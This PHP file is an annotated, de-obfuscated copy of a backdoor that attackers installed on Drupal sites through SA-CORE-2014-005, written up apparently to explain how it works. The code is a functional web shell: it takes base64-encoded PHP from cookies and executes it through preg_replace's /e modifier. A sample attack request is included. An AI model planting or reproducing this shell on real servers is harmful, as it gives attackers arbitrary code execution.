<?php
/**
 * @file
 *   A de-obfuscated version of the file used by some attackers to install
 *   backdoors on drupal sites, using the Drupal SA-CORE-2014-005 vulnerabilty.
 *
 * @usage
 *   Runs any php code supplied by the user as a base64_encoded string in a
 *   cookie.
 *
 * @example
 *   Once this file is inserted anywhere in the Drupal root, the attacker would use
 *   it by issuing the following HTTP request:
 *
 *   GET /modules/poll/zkwv.php HTTP/1.1
 *   Host: exploited.com
 *   Cookie: first_malicious_function_name=base64_decode;second_malicious_function_name=cHJlZ19yZXBsYWNl;arbitrary_php_to_run=ZmlsZV9wdXRfY29udGVudHMoIi9Vc2Vycy9tYXR0L0Rlc2t0b3AvZ29vZ2xlLmh0bWwiLCBmaWxlX2dldF9jb250ZW50cygiaHR0cDovL2dvb2dsZS5jb20iKSk7;
 *
 *   Note that the entire payload is contained in HTTP cookies. The above example
 *   will download the contents of http://google.com to the desktop of my computer
 *
 * @requirements
 *   Drupal 7 before 7.32 or <8.0.x-beta2
 *
 * @see https://www.drupal.org/SA-CORE-2014-005
 * @see https://www.drupal.org/node/2357241
 */

/**
 * The hacker is going to send us 3 values in cookies.  The first of these three
 * is just a plain text string, "base64_encode".  This will be used later in the
 * script as function name.  In the original script, this cookie was called "Kcqf3"
 * which I think is just an arbitrary name.
 */
$base64_decode = $_COOKIE["first_malicious_function_name"];

/**
 * We first check to see if we succesfully set a cookie on line 1.  All the code
 * we want to execute will be passed in cookies.  If for some reason the current
 * file is unable to read cookies (e.g. because it's being reverse proxied by
 * Varnish) don't even bother with the rest of this code.
 */
if ($base64_decode) {

  /**
   * base64_decode is the only value sent by the hacker in plain text.  The
   * rest of the code sent by the hacker is base64_encoded.  The attacker has
   * included the name of another function, this one base64_encoded.  The exact
   * value supplied by the attacker in the case is 'cHJlZ19yZXBsYWNl' which gets
   * decoded as "preg_replace".  In the original script, this cookie was called
   * "Kcqf2".
   */
  $preg_replace = $base64_decode($_COOKIE["second_malicious_function_name"]);

  /**
   * This next line is really where the magic happens.  The string that we pass
   * to the server using the the cookie.  Because we know that the next step is
   * to download a file from an external server, we can infer that the contents
   * of the arbitrary_php_to_run cookie is a base64_encoded version of this code:
   *
   *  file_put_contents(
   *    "/Users/matt/Desktop/google.html",
   *    file_get_contents("http://google.com")
   *  );
   *
   * I could use this same technique to execute any code I want on the exploited
   * server, but we know in this case that the attacker is mainly interested in
   * loading backdoors onto the file system.  In the original script this cookie
   * was called "Kcqf1".
   */
  $arbitrary_code_to_run = $base64_decode($_COOKIE['arbitrary_php_to_run']);

  /**
   * This is leveraging a known weakness in preg_replace, which allows the
   * second argument to be evaluated as PHP code.  So the actual find/replace
   * operation is not important here. "292" is just a made up character set, it
   * could be any string or integer.  preg_replace is going to execute my PHP
   * code supplied in the $arbitrary_code_to_run variable, and search through
   * this code for the number 292 and replace any instances of that number with
   * 292.  Again, 292 is just a made up number it could be literally anything.
   * The key here is that I am executing PHP code, the fact that I subsequently
   * do a find and replace on that code is unimportant.
   *
   * @see https://php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval
   */
  $preg_replace("/292/e", $arbitrary_code_to_run, 292);
}
/**
 * Lastly, if you actually attempt to navigate to this page, you will simply
 * see the output of phpinfo();
 */
phpinfo();
